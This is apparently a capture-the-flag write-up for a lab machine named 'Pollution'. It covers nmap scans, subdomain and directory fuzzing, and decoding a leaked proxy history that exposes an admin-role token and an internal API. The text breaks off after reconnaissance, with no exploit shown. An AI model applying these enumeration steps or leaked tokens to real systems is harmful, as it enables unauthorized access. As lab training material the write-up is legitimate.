# Pollution

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.105.58
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 20:00 CET
Nmap scan report for 10.129.105.58
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.54 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/3%OT=22%CT=1%CU=35692%PV=Y%DS=2%DC=T%G=Y%TM=638B9CF
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   58.61 ms 10.10.14.1
2   59.19 ms 10.129.105.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.48 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.105.58
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 20:01 CET
Nmap scan report for 10.129.105.58
Host is up (0.059s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
80/tcp    open     http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
6379/tcp  open     redis   Redis key-value store
37693/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/3%OT=22%CT=1%CU=33400%PV=Y%DS=2%DC=T%G=Y%TM=638B9D5
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   63.23 ms 10.10.14.1
2   63.28 ms 10.129.105.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.11 seconds
```

```c
$ sudo nmap -sV -sU 10.129.105.58
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 20:02 CET
Nmap scan report for 10.129.105.58
Host is up (0.058s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1149.46 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.105.58/

> http://10.129.105.58/login

> http://10.129.105.58/register

```c
$ whatweb http://10.129.105.58
http://10.129.105.58 [200 OK] Apache[2.4.54], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@collect.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.105.58], JQuery[2.1.0], Lightbox, Script, Title[Home]
```

I found the `vhost` of the box and added it to me `/etc/hosts` file.

```c
$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali

10.129.105.58   collect.htb
```

I also clicked on about and got a very interesting `url` back.

> http://10.129.105.58/#[object%20Object]

### Subdomain Enumeration with ffuf

```c
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.collect.htb" -u http://collect.htb --fs 26197

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://collect.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.collect.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 26197
________________________________________________

forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 123ms]
developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 65ms]
:: Progress: [114441/114441] :: Job [1/1] :: 336 req/sec :: Duration: [0:06:25] :: Errors: 0 ::
```

I added those as well.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.129.105.58   collect.htb
10.129.105.58   forum.collect.htb
10.129.105.58   developers.collect.htb
```

## Enumerating the Subdomains

> http://forum.collect.htb/

> http://developers.collect.htb/

> http://forum.collect.htb/forumdisplay.php?fid=2

There was a hint about the `Pollution API`. I also found several usernames.

> http://forum.collect.htb/memberlist.php

```c
sysadmin
john
victor
jane
karldev
jeorge
lyon
```

```c
$ whatweb http://forum.collect.htb/
http://forum.collect.htb/ [200 OK] Apache[2.4.54], Cookies[mybb[lastactive],mybb[lastvisit],sid], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], HttpOnly[sid], IP[10.129.105.58], JQuery[1823], PasswordField[quick_password], PoweredBy[--], Script[text/javascript], Title[Forums]
```

```c
$ whatweb http://developers.collect.htb/
http://developers.collect.htb/ [401 Unauthorized] Apache[2.4.54], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.105.58], Title[401 Unauthorized], WWW-Authenticate[Restricted Content][Basic]
```

```c
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://forum.collect.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://forum.collect.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 75ms]
images                  [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 64ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 95ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 94ms]
#                       [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 109ms]
#                       [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 113ms]
# Copyright 2007 James Fisher [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 123ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 127ms]
#                       [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 111ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 119ms]
archive                 [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 60ms]
# on at least 2 different hosts [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 131ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 134ms]
                        [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 142ms]
# Priority-ordered case-insensitive list, where entries were found [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 147ms]
#                       [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 156ms]
uploads                 [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 57ms]
admin                   [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 57ms]
install                 [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 57ms]
cache                   [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 59ms]
inc                     [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 62ms]
jscripts                [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 58ms]
                        [Status: 200, Size: 14181, Words: 911, Lines: 337, Duration: 80ms]
server-status           [Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 58ms]
:: Progress: [207643/207643] :: Job [1/1] :: 678 req/sec :: Duration: [0:05:12] :: Errors: 0 ::
```

### Getting Proxy_log.txt

I created a new account and downloaded the `proxy_history.txt`.

| Username | Password | Email |
| --- | --- | --- |
| foobar | asdfasdf | foobar@foobar.local |

> http://forum.collect.htb/showthread.php?tid=13

> http://forum.collect.htb/attachment.php?aid=3

```c
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2022.8.4" exportTime="Thu Sep 22 18:35:53 BRT 2022">
  <item>
    <time>Thu Sep 22 18:28:02 BRT 2022</time>
    <url><![CDATA[https://storyset.com/for-figma]]></url>
    <host ip="104.26.14.119">storyset.com</host>
    <port>443</port>
    <protocol>https</protocol>
    <method><![CDATA[GET]]></method>
    <path><![CDATA[/for-figma]]></path>
    <extension>null</extension>
    <request base64="true"><![CDATA[R0VUIC9mb3ItZmlnbWEgSFRUUC8xLjENCkhvc3Q6IHN0b3J5c2V0LmNvbQ0KQ29va2llOiBfZ2E9R0ExLjIuNTczMzMyMTA2LjE2NjA1MzE3MTA7IF9naWQ9R0ExLjIuMTQyNDMyNzAxLjE2NjM4ODIwNzk7IF9nYXQ9MQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTA0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA0LjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBwdC1CUixwdDtxPTAuOCxlbi1VUztxPTAuNSxlbjtxPTAuMw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KVGU6IHRyYWlsZXJzDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
    <status>200</status>
    <responselength>12888</responselength>
<--- SNIP --->
    <status>200</status>
    <responselength>3701</responselength>
    <mimetype>script</mimetype>
    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjM0OjUwIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpMYXN0LU1vZGlmaWVkOiBTYXQsIDI3IEF1ZyAyMDIyIDE0OjI5OjI2IEdNVA0KRVRhZzogImQ1My01ZTczOWRiOGYzNDQwLWd6aXAiDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMzQxMQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vamF2YXNjcmlwdA0KDQp2YXIgUmF0aW5nID0gewoJaW5pdDogZnVuY3Rpb24oKQoJewoJCXZhciByYXRpbmdfZWxlbWVudHMgPSAkKCIuc3Rhcl9yYXRpbmciKTsKCQlyYXRpbmdfZWxlbWVudHMuZWFjaChmdW5jdGlvbigpCgkJewoJCQl2YXIgcmF0aW5nX2VsZW1lbnQgPSAkKHRoaXMpOwoJCQl2YXIgZWxlbWVudHMgPSByYXRpbmdfZWxlbWVudC5maW5kKCJsaSBhIik7CgkJCWlmKHJhdGluZ19lbGVtZW50Lmhhc0NsYXNzKCJzdGFyX3JhdGluZ19ub3RyYXRlZCIpKQoJCQl7CgkJCQllbGVtZW50cy5lYWNoKGZ1bmN0aW9uKCkKCQkJCXsKCQkJCQl2YXIgZWxlbWVudCA9ICQodGhpcyk7CgkJCQkJZWxlbWVudC5vbignY2xpY2snLCBmdW5jdGlvbigpCgkJCQkJewoJCQkJCQl2YXIgcGFyYW1ldGVyU3RyaW5nID0gZWxlbWVudC5hdHRyKCJocmVmIikucmVwbGFjZSgvLipcPyguKikvLCAiJDEiKTsKCQkJCQkJcmV0dXJuIFJhdGluZy5hZGRfcmF0aW5nKHBhcmFtZXRlclN0cmluZyk7CgkJCQkJfSk7CgkJCQl9KTsKCQkJfQoJCQllbHNlCgkJCXsKCQkJCWVsZW1lbnRzLmVhY2goZnVuY3Rpb24oKQoJCQkJewoJCQkJCXZhciBlbGVtZW50ID0gJCh0aGlzKTsKCQkJCQllbGVtZW50LmF0dHIoIm9uY2xpY2siLCAicmV0dXJuIGZhbHNlOyIpOwoJCQkJCWVsZW1lbnQuY3NzKCJjdXJzb3IiLCAiZGVmYXVsdCIpOwoJCQkJCXZhciBlbGVtZW50X2lkID0gZWxlbWVudC5hdHRyKCJocmVmIikucmVwbGFjZSgvLipcPyguKikvLCAiJDEiKS5tYXRjaCgvdGlkPSguKikmKC4qKSYvKVsxXTsKCQkJCQllbGVtZW50LmF0dHIoInRpdGxlIiwgJCgiI2N1cnJlbnRfcmF0aW5nXyIrZWxlbWVudF9pZCkudGV4dCgpKTsKCQkJCX0pOwoJCQl9CgkJfSk7Cgl9LAoKCWJ1aWxkX2ZvcnVtZGlzcGxheTogZnVuY3Rpb24odGlkLCBvcHRpb25zKQoJewoJCXZhciBsaXN0ID0gJCgiI3JhdGluZ190aHJlYWRfIit0aWQpOwoJCWlmKCFsaXN0Lmxlbmd0aCkKCQl7CgkJCXJldHVybjsKCQl9CgkJCgkJbGlzdC5hZGRDbGFzcygic3Rhcl9yYXRpbmciKQoJCQkuYWRkQ2xhc3Mob3B0aW9ucy5leHRyYV9jbGFzcyk7CgoJCWxpc3RfY2xhc3NlcyA9IG5ldyBBcnJheSgpOwoJCWxpc3RfY2xhc3Nlc1sxXSA9ICdvbmVfc3Rhcic7CgkJbGlzdF9jbGFzc2VzWzJdID0gJ3R3b19zdGFycyc7CgkJbGlzdF9jbGFzc2VzWzNdID0gJ3RocmVlX3N0YXJzJzsKCQlsaXN0X2NsYXNzZXNbNF0gPSAnZm91cl9zdGFycyc7CgkJbGlzdF9jbGFzc2VzWzVdID0gJ2ZpdmVfc3RhcnMnOwoKCQlmb3IodmFyIGkgPSAxOyBpIDw9IDU7IGkrKykKCQl7CgkJCXZhciBsaXN0X2VsZW1lbnQgPSAkKCI8bGk+PC9saT4iKTsKCQkJdmFyIGxpc3RfZWxlbWVudF9hID0gJCgiPGE+PC9hPiIpOwoJCQlsaXN0X2VsZW1lbnRfYS5hZGRDbGFzcyhsaXN0X2NsYXNzZXNbaV0pCgkJCQkJCSAgLmF0dHIoInRpdGxlIiwgbGFuZy5zdGFyc1tpXSkKCQkJCQkJICAuYXR0cigiaHJlZiIsICIuL3JhdGV0aHJlYWQucGhwP3RpZD0iK3RpZCsiJnJhdGluZz0iK2krIiZteV9wb3N0X2tleT0iK215X3Bvc3Rfa2V5KQoJCQkgICAgICAgICAgICAgIC5odG1sKGkpOwoJCQlsaXN0X2VsZW1lbnQuYXBwZW5kKGxpc3RfZWxlbWVudF9hKTsKCQkJbGlzdC5hcHBlbmQobGlzdF9lbGVtZW50KTsKCQl9Cgl9LAoKCWFkZF9yYXRpbmc6IGZ1bmN0aW9uKHBhcmFtZXRlclN0cmluZykKCXsKCQl2YXIgdGlkID0gcGFyYW1ldGVyU3RyaW5nLm1hdGNoKC90aWQ9KC4qKSYoLiopJi8pWzFdOwoJCXZhciByYXRpbmcgPSBwYXJhbWV0ZXJTdHJpbmcubWF0Y2goL3JhdGluZz0oLiopJiguKikvKVsxXTsKCQkkLmFqYXgoCgkJewoJCQl1cmw6ICdyYXRldGhyZWFkLnBocD9hamF4PTEmbXlfcG9zdF9rZXk9JytteV9wb3N0X2tleSsnJnRpZD0nK3RpZCsnJnJhdGluZz0nK3JhdGluZywKCQkJYXN5bmM6IHRydWUsCgkJCW1ldGhvZDogJ3Bvc3QnLAoJCQlkYXRhVHlwZTogJ2pzb24nLAoJICAgICAgICBjb21wbGV0ZTogZnVuY3Rpb24gKHJlcXVlc3QpCgkgICAgICAgIHsKCSAgICAgICAgCVJhdGluZy5yYXRpbmdfYWRkZWQocmVxdWVzdCwgdGlkKTsKCSAgICAgICAgfQoJCX0pOwoJCXJldHVybiBmYWxzZTsKCX0sCgoJcmF0aW5nX2FkZGVkOiBmdW5jdGlvbihyZXF1ZXN0LCBlbGVtZW50X2lkKQoJewoJCXZhciBqc29uID0gSlNPTi5wYXJzZShyZXF1ZXN0LnJlc3BvbnNlVGV4dCk7CgkJaWYoanNvbi5oYXNPd25Qcm9wZXJ0eSgiZXJyb3JzIikpCgkJewoJCQkkLmVhY2goanNvbi5lcnJvcnMsIGZ1bmN0aW9uKGksIGVycm9yKQoJCQl7CgkJCQkkLmpHcm93bChsYW5nLnJhdGluZ3NfdXBkYXRlX2Vycm9yICsgJyAnICsgZXJyb3IsIHt0aGVtZTonamdyb3dsX2Vycm9yJ30pOwoJCQl9KTsKCQl9CgkJZWxzZSBpZihqc29uLmhhc093blByb3BlcnR5KCJzdWNjZXNzIikpCgkJewoJCQl2YXIgZWxlbWVudCA9ICQoIiNyYXRpbmdfdGhyZWFkXyIrZWxlbWVudF9pZCk7CgkJCWVsZW1lbnQucGFyZW50KCkuYmVmb3JlKGVsZW1lbnQubmV4dCgpKTsKCQkJZWxlbWVudC5yZW1vdmVDbGFzcygic3Rhcl9yYXRpbmdfbm90cmF0ZWQiKTsKCgkJCSQuakdyb3dsKGpzb24uc3VjY2Vzcywge3RoZW1lOidqZ3Jvd2xfc3VjY2Vzcyd9KTsKCQkJaWYoanNvbi5oYXNPd25Qcm9wZXJ0eSgiYXZlcmFnZSIpKQoJCQl7CgkJCQkkKCIjY3VycmVudF9yYXRpbmdfIitlbGVtZW50X2lkKS5odG1sKGpzb24uYXZlcmFnZSk7CgkJCX0KCgkJCXZhciByYXRpbmdfZWxlbWVudHMgPSAkKCIuc3Rhcl9yYXRpbmciKTsKCQkJcmF0aW5nX2VsZW1lbnRzLmVhY2goZnVuY3Rpb24oKQoJCQl7CgkJCQl2YXIgcmF0aW5nX2VsZW1lbnQgPSAkKHRoaXMpOwoJCQkJdmFyIGVsZW1lbnRzID0gcmF0aW5nX2VsZW1lbnQuZmluZCgibGkgYSIpOwoJCQkJaWYocmF0aW5nX2VsZW1lbnQuaGFzQ2xhc3MoJ3N0YXJfcmF0aW5nX25vdHJhdGVkJykpCgkJCQl7CgkJCQkJZWxlbWVudHMuZWFjaChmdW5jdGlvbigpCgkJCQkJewoJCQkJCQl2YXIgZWxlbWVudCA9ICQodGhpcyk7CgkJCQkJCWlmKGVsZW1lbnQuYXR0cigiaWQiKSA9PSAicmF0aW5nX3RocmVhZF8iICsgZWxlbWVudF9pZCkKCQkJCQkJewoJCQkJCQkJZWxlbWVudC5hdHRyKCJvbmNsaWNrIiwgInJldHVybiBmYWxzZTsiKQoJCQkJCQkJCSAgIC5jc3MoImN1cnNvciIsICJkZWZhdWx0IikKCQkJCQkJCSAgICAgICAuYXR0cigidGl0bGUiLCAkKCIjY3VycmVudF9yYXRpbmdfIitlbGVtZW50X2lkKS50ZXh0KCkpOwoJCQkJCQl9CgkJCQkJfSk7CgkJCQl9CgkJCX0pOwoJCQkkKCIjY3VycmVudF9yYXRpbmdfIitlbGVtZW50X2lkKS5jc3MoIndpZHRoIiwganNvbi53aWR0aCsiJSIpOwoJCX0KCX0KfTsKCmlmKHVzZV94bWxodHRwcmVxdWVzdCA9PSAxKQp7CgkkKGZ1bmN0aW9uKCkKCXsKCQlSYXRpbmcuaW5pdCgpOwoJfSk7Cn0=]]></response>
    <comment></comment>
  </item>
</items>
```

I started decoding the `Base64` stuff.

```c
UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==
```

```c
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```

| token |
| --- |
| ddac62a28254561001277727cb397baf |

```c
UE9TVCAvYXV0aC9sb2dpbiBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjE6MzAwMApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDYuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDYuMApBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgKQWNjZXB0LUxhbmd1YWdlOiBwdC1CUixwdDtxPTAuOCxlbi1VUztxPTAuNSxlbjtxPTAuMwpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUKQ29ubmVjdGlvbjogY2xvc2UKVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQpJZi1Ob25lLU1hdGNoOiBXLyIzMi1VL2RzYUs2bVRRWHJYN0RsWHhDaDVMOFlMRjgiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiAzNwoKeyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3MifQ==
```

```c
POST /auth/login HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"32-U/dsaK6mTQXrX7DlXxCh5L8YLF8"
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

{"username":"user","password":"pass"}
```

| Port |
| --- |
| 3000 |

```c
SFRUUC8xLjEgMjAwIE9LDQpYLVBvd2VyZWQtQnk6IEV4cHJlc3MNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOA0KQ29udGVudC1MZW5ndGg6IDMzDQpFVGFnOiBXLyIyMS0yME0rY1FMcFhJNGR5RTNvaGtLZmpSTnlPUmMiDQpEYXRlOiBXZWQsIDE5IE9jdCAyMDIyIDIxOjE5OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KeyJTdGF0dXMiOiJQYXJhbWV0ZXJzIG5vdCBmb3VuZCJ9
```

```c
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 33
ETag: W/"21-20M+cQLpXI4dyE3ohkKfjRNyORc"
Date: Wed, 19 Oct 2022 21:19:11 GMT
Connection: close

{"Status":"Parameters not found"}
```

```c
